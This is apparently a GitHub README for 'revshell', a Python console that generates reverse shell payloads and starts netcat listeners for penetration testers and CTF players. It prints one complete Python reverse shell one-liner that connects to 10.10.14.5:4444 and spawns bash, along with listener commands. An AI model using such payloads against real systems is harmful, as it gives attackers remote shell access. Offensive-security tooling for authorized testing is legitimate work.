
<div align="center">

```
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

**Interactive reverse shell generator console — msfconsole-style**

[![Python](https://img.shields.io/badge/Python-3.10%2B-3776ab?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-lightgrey?style=flat-square&logo=linux)](https://github.com)
[![License](https://img.shields.io/badge/License-MIT-22c55e?style=flat-square)](LICENSE)
[![Version](https://img.shields.io/badge/Version-v1.1-red?style=flat-square)](https://github.com/ZetaOrioniss/revshell)
[![Payloads](https://img.shields.io/badge/Payloads-Invicti-ef4444?style=flat-square)](https://www.invicti.com)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square)](https://github.com/ZetaOrioniss/revshell/pulls)

[Features](#-features) · [Why revshell?](#-why-revshell) · [Install](#-installation) · [Usage](#-usage) · [Commands](#-commands) · [Interfaces](#-network-interface-picker) · [Payloads](#-available-payloads) · [FAQ](#-faq)

</div>

---

## What is revshell?

**revshell** is an interactive terminal console for generating reverse shell payloads, built for penetration testers and CTF players. Inspired by the `msfconsole` workflow, it lets you configure your LHOST and LPORT once — then generate any payload instantly, start a real listener, and manage everything from a single persistent session.

Version 1.1 adds **network interface awareness**: instead of looking up your IP manually, you can set LHOST directly from an interface name (`set ip tun0`) or use the interactive picker (`ifconfig pick`) to select it from a numbered list.

```
revshell (10.10.14.5:4444) > use python

  ────────────────────────────────────────────────────────────────────────────
  🐧 Python  (unix)
  ────────────────────────────────────────────────────────────────────────────

  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));
  os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

  Listener:  nc -lvnp 4444
```

---

## ✨ Features

| | Feature | Detail |
|---|---|---|
| 🖥️ | **Interactive REPL console** | Persistent session — set your config once, generate any payload instantly |
| 🔴 | **Dynamic prompt** | Always shows current `IP:PORT` — never lose track of your session state |
| 🌐 | **Interface-aware LHOST** | Set LHOST from an interface name (`tun0`, `eth0`) — IP is resolved automatically |
| 🖱️ | **Interactive interface picker** | `ifconfig pick` displays a numbered list — select by number or name |
| ⚠️ | **Visual placeholders** | Unset values appear in red `<LHOST>` / `<LPORT>` — no more broken payloads |
| 🔀 | **12 payloads** | Bash, Bash 196, Python, Perl, PHP, Netcat, Netcat mkfifo, Ruby, Socat, AWK, PowerShell, PS Base64 |
| 🐧🪟 | **Platform filtering** | `run --unix` / `run --windows` to filter by OS |
| 📡 | **Real listener** | `listener` and `rlwrap` start an actual `nc -lvnp` session from inside the console |
| 🔍 | **Netcat auto-detection** | Checks for `nc`, `ncat`, `netcat` — gives clear install hint if missing |
| 💾 | **Persistent config** | LHOST and LPORT saved to `conf.json` — reload anytime with `load config` |
| ⌨️ | **Tab completion** | Commands, keys, payload names, and **interface names** all autocomplete |
| ⬆️ | **Command history** | Navigate previous commands with arrow keys |
| 📦 | **Zero dependencies** | Pure Python standard library — nothing to install beyond Python 3.10 |

---

## 💡 Why revshell?

The typical CTF flow for getting a reverse shell looks like this:

1. Run `ip a` in a separate terminal to find your VPN IP
2. Open a browser / grep your notes for the right payload
3. Copy it, manually replace the IP and port
4. Open another terminal for the listener
5. Repeat every time you pivot to a new machine

**revshell collapses all of that into one place.** Type `ifconfig pick`, select `tun0`, and your LHOST is set. Every payload is pre-filled. Your listener starts in the same window with a single command. The config persists across sessions.

### Compared to alternatives

| | revshell | revshells.com | msfconsole | grep from notes |
|---|:---:|:---:|:---:|:---:|
| Works offline | ✅ | ❌ | ✅ | ✅ |
| No dependencies | ✅ | ✅ | ❌ | ✅ |
| Set IP from interface name | ✅ | ❌ | ✅ | ❌ |
| Real listener built-in | ✅ | ❌ | ✅ | ❌ |
| Persistent config | ✅ | ❌ | ✅ | ❌ |
| Tab completion | ✅ | ❌ | ✅ | ❌ |
| Lightweight / single file | ✅ | ✅ | ❌ | ✅ |

---

## 📦 Installation

No pip, no virtualenv, no setup. Python 3.10+ is the only requirement.

```bash
git clone https://github.com/ZetaOrioniss/revshell.git
cd revshell
chmod +x revshell.py
```

**Optional — install system-wide:**

```bash
sudo cp revshell.py /usr/local/bin/revshell
```

**Optional dependencies** (for the listener):

```bash
sudo apt install netcat-openbsd   # listener
sudo apt install rlwrap           # upgraded TTY on listener
```

---

## 🚀 Usage

```bash
python3 revshell.py
```

### Typical CTF workflow

```
# Option A — set IP from interface (tun0, eth0, etc.)
revshell (-:-) > set ip tun0
  LHOST => 10.10.14.5  (resolved from interface tun0)

# Option B — interactive picker
revshell (-:-) > ifconfig pick
  #   INTERFACE    IPv4
  1.  lo           127.0.0.1
  2.  eth0         192.168.1.42
  3.  tun0         10.10.14.5
  > 3
  LHOST => 10.10.14.5  (tun0)

# Set port and generate payloads
revshell (10.10.14.5:-) > set port 4444
revshell (10.10.14.5:4444) > run              ← all payloads
revshell (10.10.14.5:4444) > use bash         ← one payload
revshell (10.10.14.5:4444) > run --windows    ← Windows only
revshell (10.10.14.5:4444) > listener         ← nc -lvnp 4444
revshell (10.10.14.5:4444) > rlwrap           ← rlwrap nc -lvnp 4444

# Save and reload config
revshell (10.10.14.5:4444) > load config      ← restore from conf.json
```

---

## 📋 Commands

### Configuration

| Command | Description |
|---|---|
| `set ip <address\|iface>` | Set LHOST — accepts a raw IP **or** an interface name (`tun0`, `eth0`…) |
| `set port <port>` | Set LPORT — also accepts `set lport` |
| `unset ip` | Clear LHOST |
| `unset port` | Clear LPORT |
| `show options` | Display current LHOST and LPORT |
| `load config` | Reload LHOST and LPORT from `conf.json` |

### Network Interfaces

| Command | Description |
|---|---|
| `ifconfig` / `interfaces` | List all IPv4 interfaces |
| `ifconfig pick` | Interactive numbered picker — sets LHOST on selection |
| `ifconfig <name>` | Show all interfaces, highlighting the named one |

### Payloads

| Command | Description |
|---|---|
| `show` | List all payload keys and platforms |
| `use <name>` | Display a single payload (e.g. `use python`) |
| `run` / `generate` | Display all payloads with current config |
| `run <name>` | Display a specific payload |
| `run --unix` / `-u` | Show Unix payloads only |
| `run --windows` / `-w` | Show Windows payloads only |

### Listener

| Command | Description |
|---|---|
| `listener` | Start `nc -lvnp <LPORT>` — binary auto-detected |
| `rlwrap` | Start `rlwrap nc -lvnp <LPORT>` for upgraded TTY |

### Other

| Command | Description |
|---|---|
| `clear` | Clear the screen and reprint the banner |
| `help` | Show the full command reference |
| `exit` / `quit` | Exit the console |

---

## 🌐 Network Interface Picker

One of the most tedious parts of a CTF is finding your VPN IP before generating payloads. revshell v1.1 solves this with three methods:

**Method 1 — set directly from interface name:**
```
revshell (-:-) > set ip tun0
  LHOST => 10.10.14.5  (resolved from interface tun0)
```

Tab-complete works here too — pressing Tab after `set ip ` will suggest available interface names.

**Method 2 — interactive picker:**
```
revshell (-:-) > ifconfig pick

  #   INTERFACE    IPv4
  ────────────────────────────────────────────────────
  1.  eth0         192.168.1.42
  2.  tun0         10.10.14.5
  ────────────────────────────────────────────────────
  Enter number or interface name (empty to cancel):
  > 2
  LHOST => 10.10.14.5  (tun0)
```

**Method 3 — browse interfaces first, then decide:**
```
revshell (-:-) > ifconfig

  INTERFACE    IPv4
  eth0         192.168.1.42
  tun0         10.10.14.5

  Tip: ifconfig pick to interactively set LHOST
  Tip: set ip <iface> to set LHOST from an interface name
```

IP resolution uses three fallback methods internally (`fcntl` ioctl → `ip -4 addr` → `ifconfig`) to work across Linux distributions and macOS.

---

## 💾 Persistent Config

revshell saves LHOST and LPORT to a `conf.json` file in the current directory every time you use `set`. On your next session, restore them with a single command:

```
revshell (-:-) > load config
  LHOST loaded from config: 10.10.14.5
  LPORT loaded from config: 4444
```

`conf.json` format:
```json
{
    "param": {
        "host": "10.10.14.5",
        "port": "4444"
    }
}
```

---

## 🔀 Available Payloads

| Key | Name | Platform |
|---|---|---|
| `bash` | Bash | 🐧 Unix |
| `bash_196` | Bash 196 | 🐧 Unix |
| `python` | Python 3 | 🐧 Unix |
| `perl` | Perl | 🐧 Unix |
| `php` | PHP | 🐧 Unix |
| `nc` | Netcat | 🐧 Unix |
| `nc_mkfifo` | Netcat mkfifo | 🐧 Unix |
| `ruby` | Ruby | 🐧 Unix |
| `socat` | Socat | 🐧 Unix |
| `awk` | AWK | 🐧 Unix |
| `powershell` | PowerShell | 🪟 Windows |
| `ps_b64` | PowerShell Base64 | 🪟 Windows |

Payloads sourced from [Invicti](https://www.invicti.com).

---

## ❓ FAQ

**Can I use an interface name instead of an IP?**
Yes — `set ip tun0` resolves the interface's IPv4 address automatically. Interface names also autocomplete with Tab.

**What if my interface has no IPv4 (e.g. IPv6 only)?**
revshell will tell you the interface was not found or has no IPv4 address, and suggest running `ifconfig` to check.

**Where is conf.json saved?**
In the current working directory when you launch `revshell.py`. Move the file or symlink it if you want a shared config across locations.

**What if netcat is not installed?**
The `listener` and `rlwrap` commands will tell you which package to install (`sudo apt install netcat-openbsd`). Payload generation works without netcat.

**Can I run it on Windows?**
The core logic works on Windows with Python 3.10+. The interface picker relies on Linux/macOS system calls and will fall back gracefully, though results may be incomplete. `readline` may require `pyreadline3` on Windows (`pip install pyreadline3`).

**Does it save my payloads?**
It saves LHOST and LPORT to `conf.json`. Individual payloads are generated on the fly — copy them directly from the terminal output.

---

## ⚠️ Disclaimer

This tool is intended **for authorized penetration testing, CTF competitions, and educational purposes only**.

The author is not responsible for any misuse or damage caused by this program. Always obtain proper **written authorization** before testing systems you do not own. Unauthorized use of reverse shells against systems without consent is **illegal**.

---

<div align="center">

Payloads sourced from [Invicti](https://www.invicti.com) &nbsp;•&nbsp; Built for the terminal &nbsp;•&nbsp; by [@ZetaOrioniss](https://github.com/ZetaOrioniss)

</div>
